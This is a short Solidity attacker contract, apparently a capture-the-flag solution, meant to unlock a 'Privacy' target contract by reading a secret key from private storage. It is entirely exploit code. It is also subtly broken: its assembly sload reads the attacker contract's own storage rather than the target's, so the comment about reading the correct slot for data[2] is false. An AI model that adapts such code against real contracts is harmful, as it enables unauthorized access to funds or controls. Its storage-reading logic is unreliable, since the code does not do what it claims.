pragma solidity ^0.8.0;

interface IPrivacy {
    function unlock(bytes16 key) external;
}

contract PrivacyAttacker {
    IPrivacy private _instance;

    constructor(address target) {
        _instance = IPrivacy(target);
    }

    function exploit() external {
        // Read the correct storage slot for data[2]
        bytes32 storedValue = getDataFromSlot(7);
        bytes16 key = bytes16(storedValue);
        _instance.unlock(key);
    }

    function getDataFromSlot(uint256 slot) internal view returns (bytes32) {
        bytes32 value;
        assembly {
            value := sload(slot)
        }
        return value;
    }
}